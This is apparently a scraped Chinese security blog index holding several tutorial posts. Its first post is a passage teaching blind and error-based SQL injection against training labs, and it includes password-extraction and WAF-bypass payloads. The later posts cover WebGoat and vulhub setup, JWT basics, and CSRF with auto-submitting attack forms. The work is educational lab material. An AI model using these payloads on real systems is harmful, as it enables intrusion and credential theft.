无回显的表现。\n只会给出 true 或 false 的信息，或者给出延时的信息，或者一些其他的信息(比如报错) ———————— 这里就是我所说的侧面回显。\n所以，我们只能根据有限的信息去获取数据库中更多地信息，这种方式像盲人摸象一样，只能一点一点的去收集数据库的信息（每一次的true表示获取一个有效信息），来慢慢形成对整个数据库信息的理解（表名是什么，列名是什么），最终达到获取数据库中数据的目的（获取某个表的某个值）。\n\n最重要的一定是先找注入点，判断是否存在注入点，多试试各种地方，比如 Login 的登录界面，Register 注册界面等\n\n(2). 盲注之布尔盲注，也就是 True 与 False 的回显\n布尔盲注，只会根据你的注入信息返回 True 或 False，也就没有了之前的报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;123&#39;&#39; at line 1\n\n布尔盲注判断方法：\n\n判断注入点1’ and 1&#x3D;1   &#x2F;&#x2F; 页面返回有数据1’ and 1&#x3D;2   &#x2F;&#x2F; 页面返回无数据此种情况可以推出存在 SQL 注入\n判断当前页面字段数1’ and order by 2 –   &#x2F;&#x2F; 页面返回有数据1’ and order by 3 –   &#x2F;&#x2F; 页面返回无数据判断出当前页面字段数为 2\n\n原理其实很简单，就是把 1&#x3D;1 替换成其他判断的条件即可\n\n还有一些用法，我们以这道靶场为例辅助说明 \n** T1 靶场：Lab: Blind SQL injection with conditional responses**靶场地址：SQL 布尔盲注靶场\n\n在进入靶场之前看一看题目的描述，已经告诉了我们注入点在 TrackingID 上，且不存在回显，如果 TrackingID &#x3D; True，则会返回 “Welcome Back”的信息，反之则没有\n\n靶场界面如图所示\n\n\n我们抓包，获取一下 TrackingID，并对 TrackingID 进行注入探测\n\n\n\nTrackingID\n回显\n\n\n\nTrackingID’ and ‘1’&#x3D;’1\n回显中存在 “ Welcome Back “\n\n\nTrackingID’ and ‘1’&#x3D;’2\n回显中不存在 “ Welcome Back “\n\n\n上表证明存在 SQL 注入。\n根据布尔盲注的原理\n\nTrackingID’ and True，则存在 “ Welcome Back “的回显。\nTrackingID’ and False，则不会有 “ Welcome Back “的回显。\n\n已知，题目要求我们使用 administrator 登录，那便只需将条件与 password 挂钩即可(此时我们已经大胆猜测，密码是保存在 password 这一列中的，所以直接盲注爆数据) ———— 若是不知道 表&#x2F;库&#x2F;列，则需要先一步爆破，具体内容可移步至博客下 ———— 布尔盲注\n构造判断密码长度的 payload: 个人觉得这一步还是有存在价值的，当然，直接爆其实也可以。\nTrackingID' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a\n\n\n在长度上进行爆破：\n\n\n爆破结果如下：\n\n\n当长度为 20 时，爆破的 Length 同其他的不一样，发包之后看到是无回显的，所以判断密码长度为 19\n再构造爆密码的 payload\nTrackingID' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a\n\n同样的爆破 ~ \n\n对 ‘a 设置引用 –&gt; §a§\nPayloads 设置如图，进行爆破\n\n\n结果如下：\n\n\n再修改之前的 payload，将 substring(password,1,1) 修改为 substring(password,2,1)，也就是对第二位密码进行爆破。\nTrackingID' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a\n\n以此类推，得出答案 ~\n(2). 盲注之报错盲注，当输入的参数错误时会报错\n所有的盲注都是很类似的，可以说是举一反三\n\n判断报错盲注是否存在\n\n\n判断注入点1’ AND (SELECT CASE WHEN (1&#x3D;2) THEN 1&#x2F;0 ELSE ‘a’ END)&#x3D;’a    &#x2F;&#x2F; 此时界面正常1’ AND (SELECT CASE WHEN (1&#x3D;1) THEN 1&#x2F;0 ELSE ‘a’ END)&#x3D;’a    &#x2F;&#x2F; 报错，因为除数为零\n判断字段数1’ AND (SELECT CASE WHEN (1&#x3D;2) THEN 1&#x2F;0 ELSE order by 2 –        &#x2F;&#x2F; 界面正常1’ AND (SELECT CASE WHEN (1&#x3D;1) THEN 1&#x2F;0 ELSE order by 2 –        &#x2F;&#x2F; 报错，并判断字段数是否为 2\n\n\n** T2 靶场：Lab: Blind SQL injection with conditional errors**靶场地址：SQL 报错盲注靶场\n\n靶场提示了，用的是 Oracle 数据库，所以我们的 payload 要稍微调整一些，但是整体逻辑是不变的。\n验证一下报错与注入点\n\n\n\n\n输入\n回显\n\n\n\nTrackingID’\n状态码：500\n\n\nTrackingID\n状态码：200\n\n\n利用两者清晰的回显不同，进行报错注入，构造 payload：\nTrackingId'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'      // 获得 500 报错\nTrackingId'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'      // 回显正确，200\n\n\n同上题一样，在已知是想要通过 administrator 登录的情况下，可以先进行验证，因为在实战渗透环境当中，不一定都还会有 admin，administrator 这些账号的。\n\npayload：\nTrackingId'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n\n\n200 的状态码，表示存在一个名为 administrator的用户，接着爆密码长度。\nTrackingId'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n在 Intruder 模块对数字进行绝对引用，1 –&gt; §1§\n\n\n长度为 21，接着和布尔盲注的判断密码步骤类似，这里挂一下 payload，就不展开细讲了。\nTrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\n\n(3) 盲注之延时注入判断延时注入是否存在\n\n\n判断注入点1’ ; (SELECT CASE WHEN (1&#x3D;2) THEN sleep(10) ELSE sleep(0) –  &#x2F;&#x2F; 此时界面无延时1’ ; (SELECT CASE WHEN (1&#x3D;1) THEN sleep(10) ELSE sleep(0) –    &#x2F;&#x2F; 此时界面延时 10 s\n判断字段数1’ ; (SELECT CASE WHEN (1&#x3D;2) THEN sleep(10) ELSE order by 2 –        &#x2F;&#x2F; 界面正常，会去判断字段数是否为 21’ ; (SELECT CASE WHEN (1&#x3D;1) THEN sleep(10) ELSE order by 2 –       &#x2F;&#x2F; 延时 10 s\n\n\nT3 靶场：Lab: Blind SQL injection with time delays and information retrieval靶场地址：SQL 延时盲注靶场\n\n本道靶场的数据库是 PgSQL，所以 payload 方面会稍作改变，但原理还是一样的。\n\n还是老样子，抓包，并且根据题目的提示，TrackingID 为注入点\n构造判断注入点的 payload：\nTrackingId'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- // 此界面延时了 10s\n\nTrackingId'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- // 毫无延时\n\n\n再根据题意，确认一遍是否存在 administrator\n\nTrackingId'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n存在延时，说明确实存在 user &#x3D; administrator\n后续的步骤还是同之前一样的逻辑，爆密码长度，然后一个个爆，挂一下 payload 吧~\n\n爆破密码长度的 payload\n\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n\n因为是延时注入，所以会比较耗时间，大家做题的时候可以先挂着，然后再去做别的事情。爆了两分钟才发了 9 次包\n\n\n爆破密码的 payload\n\nTrackingId'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n\n0x07 SQL 报错注入我们新讲的这个 SQL 报错注入不同于之前盲注当中的报错注入，SQL 报错注入主要是针对 xpath 的。\n\n这里给大家主要介绍两个最常见的报错注入函数\n\nupdatexml(): 是 MySQL 对 xml 文档数据进行查询和修改的 xpath 函数\n\n\n\nextractvalue(): 是 MySQL 对 xml 文档数据进行查询的 xpath 函数\n\n\n\n1. updatexml() 函数\nupdatexml()的作用：改变文档中符合条件的节点的值\n\n\n语法\n\nupdatexml（XML_document，XPath_string，new_value）\n\n第一个参数：是string格式，为XML文档对象的名称，文中为Doc第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据。\nupdatexml报错注入万能语句：\n1 or (updatexml(1,concat(0x7e,(这里填写sql语句),0x7e),1))\n\nT4 靶场：CTFHub 下的报错注入首先拿到题目，先探测是否存在 SQL 注入，在框中输入 1’\n\n\n如此报错说明存在 SQL 注入\n再三步走，爆库，爆表，爆列\n爆库：\n1 or (updatexml(1,concat(0x7e,(database()),0x7e),1))\n\n\n\n再从 sqli 数据库下爆表\n1 or (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1))\n\n结果如下，sqli数据库中有news以及flag两个数据表\n\n\n爆字段：\n就和普通 SQL 注入的一样\n看到了 flag，那肯定是冲着 flag 去了 ~\n爆出 flag 字段中的内容\n1 or (updatexml(1,concat(0x7e,(select group_concat(flag) from sqli.flag),0x7e),1))\n\n\n\n但是这个时候出现了一个问题，flag并没有显示完全，在查看其他师傅的 WP 后才知道是因为 ———— updatexml 报错注入，报错的回显最多为32位\n这个时候可以使用substr函数，将没有显示出来的部分截取出来，从第 25 位开始截取 10 个字符。\n1 or (updatexml(1,concat(0x7e,(select substr(group_concat(flag),25,10) from sqli.flag),0x7e),1))\n\n这样就得到了完整的 flag ~ 查看后发现，其实不使用 substr 爆数据，其实直接加上大括号的另一半也可以 ~\n2. 使用extractvalue()函数其实在掌握完 updatexml 之后，对于 rxtractvalue的掌握也是大同小异，只是 payload 稍微有一些不一样，大致原理是相同的。\n作用：从目标XML中返回包含所查询值的字符串 \n\n语法：extractvalue(XML_document，xpath_string)第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串）\n\nextractvalue报错注入万能语句：\n1 or (extractvalue(1,concat(0x7e,(这里填写sql语句))))\n\n这里就直接挂一个 payload ~，师傅们看一看即可\n1 and (extractvalue(1,concat(0x7e,(select flag from flag))))\n\n\n\n同样也是 报错的回显最多为32位，和上文一致，可以通过 substr 进行截取\n0x08 SQL 注入的防御1. 构造不可变的查询1.1 静态查询SELECT * FROM users WHERE user = \"'\" + session.getAttribute(\"UserID\") + \"'\";\n\n这里的 UserID 就不经过拼接，而是直接通过 session.getAttribute 读取。\n1.2 预编译 ———— 也就是使用问号\n预编译的问题在上文我们也提到过 ~\n\nString query = \"SELECT * FROM users WHERE last_name = ?\";\nPreparedStatement statement = connection.prepareStatement(query);\nstatement.setString(1, accountName);\nResultSet results = statement.executeQuery();\n\n很多小伙伴们觉得预编译可以完美防止 SQL 注入，其实不完全是这样的。\n2. 使用转义字符转义字符，也就是过滤掉一些特殊的字符，比如单引号、括号这种，能够很好的防御 SQL 注入。\n3.对访问数据库的 Web 应用程序进行 WAF 操作。0x09 SQL 注入绕过的一些基本姿势1. 针对waf正则对大小写不敏感的情况使用大小写绕过：\n1' uNiOn seLeCt 1,2,3#\n\n2. 关键字被过滤(1) 针对部分关键字被过滤，例如union,select,information等关键字尝试双写绕过如 CTF 题目 极客大挑战 2019BabySQL原本的 payload:\n1' union select 1,2#\n\n改为 1' ununionion selselectect 1,2#\n\n使用注释符绕过常用注释符：\n//，-- , /**/, #, --+, -- -, ;,%00,--a\n\n具体的 payload：\nU/**/ NION /**/ SE/**/ LECT /**/user，pwd from user\n\n尝试大小写混搭绕过比如 UnIOn SelECt\n3. 特殊编码绕过1）十六进制绕过\nUNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B\n\n2）ascii编码绕过\nTest &#x3D;CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\n\n3）Unicode编码\n常用的几个符号的一些Unicode编码：\n单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7\n空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0\n左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8\n右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9\n4. 被转义字符绕过(1) 空格被过滤，无法输入空格\n两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：\n\n%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F;\n\n或者使用括号绕过\nselect(user())from table where(1&#x3D;1)and(2&#x3D;2)\n\n(2) 引号被过滤\n一般只可通过 16 进制绕过\n例如，原本的 SQL 语句\n\nselect column from tables where table_name=\"users\"\n这里将 users 转换为 0x7573657273\n(3) 注释符被过滤id=1' union select 1,2,3||'1\n\n\n最后的or ‘1闭合查询语句的最后的单引号，或者：\n\nid=1' union select 1,2,'3\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"一文解决搭建WebGoat的所有问题","url":"/2022/03/05/%E4%B8%80%E6%96%87%E8%A7%A3%E5%86%B3%E6%90%AD%E5%BB%BAWebGoat%E7%9A%84%E6%89%80%E6%9C%89%E9%97%AE%E9%A2%98/","content":"搭建 WebGoat\n\n一文解决搭建WebGoat的所有问题\n因为最近在专攻Java安全，而WebGoat的搭建也是必经之路。\n之前在电脑里面安装了java 11，又不想只安装到WebGoat的M14靶场，于是就有了这篇笔记。\n\n\n机器环境：一台是Centos机器，一台是Debian机器，搭建方式基本相同。\n\n0x01 环境准备我们这里选择WebGoat的jar版本，由于WebGoat 8的jar文件已自带了tomcat和数据库，所以不需要再另外安装tomcat和mysql这种东西，只需要安装jdk用于运行jar文件即可。\nWebGoat的所有版本都是依赖于Java 8的，如果之前安装是Java 11的小伙伴，不想卸载。本篇文章教你在Linux下安装JDK(多个版本) 切换~\n1.1首先，先把自己服务器里面的jdk版本全部卸载掉\n完全卸载jdk\n\n在bash界面下：1.移除所有 Java相关包Sun, Oracle, OpenJDK, IcedTea plugins, GIJ)\nsudo apt-cache search java | awk '&#123;print($1)&#125;' | grep -E -e '^(ia32-)?(sun|oracle)-java' -e '^openjdk-' -e '^icedtea' -e '^(default|gcj)-j(re|dk)' -e '^gcj-(.*)-j(re|dk)' -e 'java-common' | xargs sudo apt-get -y remove\n\nsudo apt-get -y autoremove\n\n再更新一下apt源\nsudo apt-get update\n\n2.清除配置信息\nsudo dpkg -l | grep ^rc | awk '&#123;print($2)&#125;' | xargs sudo apt-get -y purge\n\n3.清除java配置及缓存\nsudo bash -c 'ls -d /home/*/.java' | xargs sudo rm -rf\n\n4.清除jvm文件夹里面的文件\nsudo rm -rf /usr/lib/jvm/*\n\n 至此，旧版本的Java已经全部卸载完毕，不知道为什么，有股特别舒坦的感觉~\n0x02多版本Java环境搭建 之前也看了网上很多关于Java多版本环境搭建的文章，用的最多的还是下载OpenJDK的版本，然后设置一堆环境变量的，太麻烦了。\n\n思维转换，极为简便地搭建Java多版本\n\n2.1直接安装Java，选择安装最主流的Java 8、Java 11、Java 17\nJava8的安装\n\n// Centos:\nsudo yum install -y java-1.8.0-openjdk-devel.x86_64\n\n// Debian:\n看了很多教程，较为麻烦\n\n安装完毕之后查看Java版本\n\n\n\nJava11的安装\n\n// Centos:\nsudo yum install java-11-openjdk -y\n\n// Debian:\nsudo apt install openjdk-11-jdk\nsudo apt install openjdk-11-jre\n然而我们在查看Java版本：java -version的时候，跳出来的变成了Java 11。可是搭建WebGoat的时候，是只支持Java 8的，如果用Java 11搭建的话，我们会得到如图所示的报错。\n\n\n那也就是说，我们要将Java版本切换至Java 8，才可以搭建WebGoat。bash输入切换Java版本的命令：\nsudo update-alternatives --config java\n\n\n我们在框内输入数字即可切换Java版本，同理，如果有Java 17的版本，也同样可以被切换。至此，如果想搭建WebGoat（v8.0.0.M14）的伙伴们已经可以直接搭建了。毕竟搭建WebGoat的主要目的是代码审计嘛~\n\nJava 17的安装\n\n// Centos:\n相对麻烦，需要配置环境变量\n\n// Debian:\nsudo apt install openjdk-17-jdk\nsudo apt install openjdk-17-jre\n\n0x03搭建WebGoat\n下载WebGoat的链接：https://github.com/WebGoat/WebGoat/releases\n\nCentos小白建议安装WebGoat（v8.0.0.M14），我当时在调试的时候安装最新版本，与Java 8、Java 11都不适配，而WebGoat又是主代码审计的靶场，所以还是建议安装最稳定的版本，少踩点坑。\n安装好Java 17的朋友们可以选择安装最新版本：WebGoat 8.2.2\n\n下载好WebGoat后，直接开跑就完事儿咯~！\n\n3.1启动WebGoat，这里以M\n1.默认监听127.0.0.10:8080地址\n\njava -jar webgoat-server-8.0.0.M14.jar  \n\n\n2.自定义ip和端口可在启动时指定相应参数，这里的server.address只要设置成0.0.0.0即可，不要自作聪明设置成公网IP，当时这里踩了个坑。\njava -jar webgoat-server-8.0.0.M14.jar --server.port=8000 --server.address=0.0.0.0\n\n3.访问地址如果是服务器搭建的：http://服务器的公网IP:端口/WebGoat/ 如果是虚拟机: ","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"vulhub的搭建与使用","url":"/2022/03/01/vulhub%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"vulhub的搭建与使用\n\nvulhub的搭建与使用搭建应该算简单了，但是我之前弄的是centos的机器，把我折磨的真的是痛不欲生。直接重装系统，换成Debian的。\n1. vulhub的搭建搭建直接clone GitHub\n两个选一个就可以，看网速\ngit clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub\ngit clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git\n\n2. vulhub的使用选择漏洞环境,在Vulhub中选择某个环境，cd进入对应目录\n $ cd vulhub/discuz/wooyun-2010-080723/\n\n可选。可以通过vi编辑其中的docker-compose.yml，修改端口和账号密码\n $ vi docker-compose.yml \n\n启动环境：\n$ docker-compose up -d   # 启动环境 \n$ docker-compose down    # 关闭环境,需要在该环境目录下执行\n\n\n如果配置文件中包含的环境均已经存在，则不会再次编译，反之则会自动进行编译。所以，其实docker-compose up -d命令是包含了docker-compose build的。\n但是如果更新了配置文件，则需要手工来重新编译靶场环境。\n\n$ docker-compose build\n\n\n这里以Struts2-001这个漏洞为例\n\n按照上述步骤操作\ncd struts2/s2-001\nsudo docker-compose up -d\nsudo docker ps // 检查容器是否开启\n\n随后访问自己主机IP的地址即可\n这里有一点要注意，需要开启防火墙，端口1-65535，再访问\n成功！\n\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"从0到1完全掌握Broken Authentication","url":"/2022/03/25/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1Broken-Authentication/","content":"从0到1完全掌握Broken-Authentication\n\n从0到1完全掌握 身份认证漏洞 Broken-Authentication0x01 前言\n整理一下关于身份认证所有的漏洞合集，说实话，实在是太多太杂了，很多业务逻辑漏洞也算是身份验证的漏洞，太多太杂了。\n写这一篇文章为了大家更好的学习，少踩坑，还请师傅们多多指点\n\n0x03 2FA 的身份验证方式0x04 JWT Tokens的身份验证\nJWT: 全称 Json Web Tokens\n\n1. 传统的 cookie 验证身份传统的 Cookie 验证，也就是 Session Cookie 的验证。\n\n1、用户向服务器发送用户名和密码。2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。3、服务器向用户返回一个 session_id，写入用户的 Cookie。4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。\n\n2. JWT 验证作用\n 一句话阐明 JWT 的验证作用  \n\n实现同一家公司的关联服务，也就是用户在 A 网站登录，而当用户访问同公司旗下的 B 网站能够自动登录\n3. 浅谈 JWT 原理JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。\n&#123;\n  \"姓名\": \"张三\",\n  \"角色\": \"管理员\",\n  \"到期时间\": \"2018年7月1日0点0分\"\n&#125;\n\n以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。\n服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。\n\nJWT 由三部分组成，Header，Payload，Signature\n\nHeader 部分Header 部分同样也是一个 json 文件，它由两部分组成\n\ntyp 部分声明 token 类型，在 JWT 中默认为 JWT\nalg 部分声明表示签字的算法，默认是 HMAC SHA256（写成 HS256）&#123;\n\t'typ': 'JWT',\n\t'alg': 'HS256'\n&#125;\n\n接着对这一个 json 对象进行 base64 编码\n&#123;\"typ\":\"JWT\",\"alg\":\"HS256\"&#125;\n\n得到的编码就构成了 Header 部分\n\n\nPayload 部分\nPayload 用来存放有效信息，这个名字像是特指飞机上承载的货品。\nJWT 官方规定了 7 个原始字段\n\n\n\niss (issuer)：签发人\nexp (expiration time)：过期时间\nsub (subject)：主题\naud (audience)：受众\nnbf (Not Before)：生效时间\niat (Issued At)：签发时间\njti (JWT ID)：编号\n\n\n除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。\n\n&#123;\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true\n&#125;\n\n同样，进行 base64 编码，得到第二段 payload\n\n\nSignature 部分Signature 部分是对前两部分的签名，防止数据篡改。\n首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。\nvar encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);\n\nvar signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\n将上述三部分组合起来，就是一个完整的 JWT \n例如这一段，中间用 “.” 来分割三个模块\neyJhbGciOiJIUzI1NiJ9.ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9.9lYaULTuoIDJ86-zKDSntJQyHPpJ2mZAbnWRfel99iI\n\nJWT Secret\nJWT 的生成：HMACSHA256(\n  base64UrlEncode(header) + &quot;.&quot; +\n  base64UrlEncode(payload),\n  secret\n)\n\n因为有这个密钥的存在，所以即便调用方偷偷的修改了前两部分的内容，在验证环节就会出现签名不一致的情况，所以保证了安全性。\n4. JWT 的应用一般是在请求头里加入Authorization，并加上Bearer标注：\nfetch('api/user/1', &#123;\n  headers: &#123;\n    'Authorization': 'Bearer ' + token\n  &#125;\n&#125;)\n\nJWT 获取 token 的原理如图所示\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"从0到1完全掌握CSRF","url":"/2022/05/08/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1CSRF/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/333173.html\n\n\n从0到1完全掌握CSRF\n二刷漏洞：知其所以然 -&gt; 知其然 -&gt; 懂其攻 -&gt; 知其守\n\n0x01 前言\n总觉得自己的 CSRF 掌握的挺不好的，如今二刷一遍。\n当初一刷的时候用的是 Port，而毕竟 Port 嘛，更加注重的是漏洞挖掘，所以当时只是简单地会用 Burpsuite 当中的 CSRF Poc 而已，其余的原理阿，防御措施阿，都不太懂。\n\n0x02 什么是 CSRF\n面试的时候的著名问题：”谈一谈你对 CSRF 与 SSRF 区别的看法”\n\n这个问题，如果我们用非常通俗的语言讲的话，CSRF 更像是钓鱼的举动，是用户攻击用户的；而对于 SSRF 来说，是由服务器发出请求，用户日服务器的。\nCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。\n在 Port 中，原理图是这样的\n\n\n\n我们在学习 CSRF 攻击之前好好先阐述一下它的原理\n\n一个典型的CSRF攻击有着如下的流程：\n\n受害者登录 a.com，并保留了登录凭证（Cookie）。\n攻击者引诱受害者访问了 b.com。\nb.com 向 a.com 发送了一个请求：a.com&#x2F;act&#x3D;xx。浏览器会默认携带 a.com 的 Cookie。\na.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。\na.com 以受害者的名义执行了 act&#x3D;xx。\n攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。\n\n是不是感觉这个工作流程和 XSS 有些类似，但是 XSS 与 CSRF 的最大区别在于对 Cookie 的使用，XSS 的把受害者 的 Cookie 偷盗过来，而 CSRF 则是借用了受害者的 Cookie。\n下面我们举个例子深化一下 CSRF 的原理。\n0x03 CSRF 实战场景(原理应用)\n本段内容摘自美团技术团队文章\n\n这一天，小明同学百无聊赖地刷着 Gmail 邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：\n\n甩卖比特币，一个只要998！！\n\n聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……\n在这平静的外表之下，黑客的攻击已然得手。小明的 Gmail 中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到 &#x68;&#x61;&#99;&#107;&#x65;&#114;&#64;&#104;&#97;&#x63;&#107;&#101;&#x72;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;(也就是攻击方的邮箱)。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。\n不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。\n小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：\n&lt;form method=\"POST\" \t\taction=\"https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf\" enctype=\"multipart/form-data\"> \n\t&lt;input type=\"hidden\" name=\"cf2_emc\" value=\"true\"/> \n\t&lt;input type=\"hidden\" name=\"cf2_email\" value=\"hacker@hakermail.com\"/> \n\t..... \n\t&lt;input type=\"hidden\" name=\"irf\" value=\"on\"/> \n\t&lt;input type=\"hidden\" name=\"nvp_bu_cftb\" value=\"Create Filter\"/> \n&lt;/form> \n\n&lt;script> document.forms[0].submit(); &lt;/script>\n\n代码解析 ———— 这也是我们后续要讲到的 CSRF Poc这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“&#104;&#97;&#x63;&#x6b;&#x65;&#114;&#x40;&#x68;&#97;&#x63;&#x6b;&#x65;&#x72;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;”。\n小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。\n黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。\n这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“&#104;&#x61;&#x63;&#x6b;&#x65;&#114;&#64;&#104;&#x61;&#99;&#107;&#101;&#x72;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;”。\n小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。\n黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。\n0x04 CSRF 的攻击方式\n上文中，我们明晰了一下 CSRF 的攻击原理，下面我们主讲漏洞挖掘。\n\n1. GET 请求产生的 CSRFGET 请求产生的 CSRF 较为简单，有 href 攻击的方式与 HTTP 请求的方式。\nGET 请求的 href 类 CSRF&lt;a href=\"http://bank.com/transfer?account_number_from=123456789&amp;account_number_to=987654321&amp;amount=100000\">View my Pictures!&lt;/a>\n\n在已经登录了bank.com的情况下，当我们点击 “View my Pictures” 这一链接时，就会将钱从一个账户转移到另一个账户，数额为 100000\nGET 请求的 HTTP 发包 CSRF一般会这样利用：\n![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)\n\n\n在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw/account=xiaoming&amp;amount=10000&amp;for=hacker 发出一次 HTTP 请求。在攻击者接收到请求的时候我们便可以“借用”对方的 Cookie。\n2. POST 请求产生的 CSRF\nPOST 请求所产生的 CSRF 是我们利用地最多的攻击方式。\n\n这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单。\n&lt;form action=\"http://bank.example/withdraw\" method=POST> \n\t&lt;input type=\"hidden\" name=\"account\" value=\"xiaoming\" /> \n\t&lt;input type=\"hidden\" name=\"amount\" value=\"10000\" /> \n\t&lt;input type=\"hidden\" name=\"for\" value=\"hacker\" /> \n&lt;/form> \n&lt;script> document.forms[0].submit(); &lt;/script>\n\n\n访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。\nPOST 类型的攻击通常比 GET 